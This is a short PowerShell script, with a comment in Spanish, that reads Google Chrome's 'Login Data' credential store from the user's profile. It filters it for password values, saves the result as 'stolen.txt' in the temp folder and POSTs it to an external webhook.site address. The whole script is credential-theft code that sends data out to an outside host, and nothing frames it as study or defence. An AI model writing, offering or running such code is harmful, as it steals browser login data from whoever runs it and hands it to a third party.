$path = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
if (Test-Path $path) {
    # Este comando intenta extraer los datos crudos
    $data = Get-Content $path -Raw | Select-String "password_value"
    if ($data) {
        $data | Out-File "$env:TEMP\stolen.txt"
        Invoke-WebRequest -UseBasicParsing -Uri 'https://webhook.site/c712d334-352a-4bea-b44b-9d94dbe4dede' -Method POST -Body ([System.Text.Encoding]::UTF8.GetBytes($data))
    }
}
